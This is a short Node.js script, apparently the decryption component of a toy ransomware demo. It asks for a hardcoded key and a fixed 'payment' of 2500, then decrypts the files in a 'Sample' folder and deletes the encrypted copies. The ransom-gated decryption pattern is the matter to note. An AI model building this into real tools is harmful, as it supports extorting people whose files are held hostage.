var encryptor = require('file-encryptor');
var fs = require('fs');
var readline = require('readline');
var path = require('path');

var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Prompt for the super key
rl.question('Enter the super key: ', function(superKey) {
  // Check if the super key is correct
  if (superKey === 'jai') {
    rl.question('Payment required: 2500. Enter payment amount: ', function(paymentAmount) {
      // Check if the payment amount is correct
      if (parseFloat(paymentAmount) === 2500) {
        // Super key and payment are correct, proceed with decryption
        decryptFiles();
      } else {
        console.error('Incorrect payment amount. Decryption aborted.');
        rl.close();
      }
    });
  } else {
    console.error('Incorrect super key. Decryption aborted.');
    rl.close();
  }
});

function decryptFiles() {
  var key = 'jai';
  var folderPath = 'Sample';

  // Get a list of all files in the specified folder
  fs.readdir(folderPath, function(err, files) {
    if (err) {
      console.error('Error reading folder:', err);
      rl.close();
      return;
    }

    // Iterate through each file in the folder
    files.forEach(function(file) {
      var encryptedFilePath = path.join(folderPath, file);
      var decryptedFileName = file.replace('encrypted_', '');
      var decryptedFilePath = path.join(folderPath, 'decrypted_' + decryptedFileName);

      // Decrypt file.
      encryptor.decryptFile(encryptedFilePath, decryptedFilePath, key, function(err) {
        if (err) {
          console.error('Decryption error for file', file, ':', err);
        } else {
          console.log('Decryption complete for file', file);

          // Optional: Delete the encrypted file after decryption
          fs.unlink(encryptedFilePath, function(err) {
            if (err) {
              console.error('Error deleting encrypted file', file, ':', err);
            } else {
              console.log('Encrypted file', file, 'deleted.');
            }
          });

          // Rename the decrypted file to its original name
          fs.rename(decryptedFilePath, path.join(folderPath, decryptedFileName), function(err) {
            if (err) {
              console.error('Error recovering original file name for', file, ':', err);
            } else {
              console.log('Original file name recovered for file', file);
            }
          });
        }
      });
    });

    rl.close();
  });
}
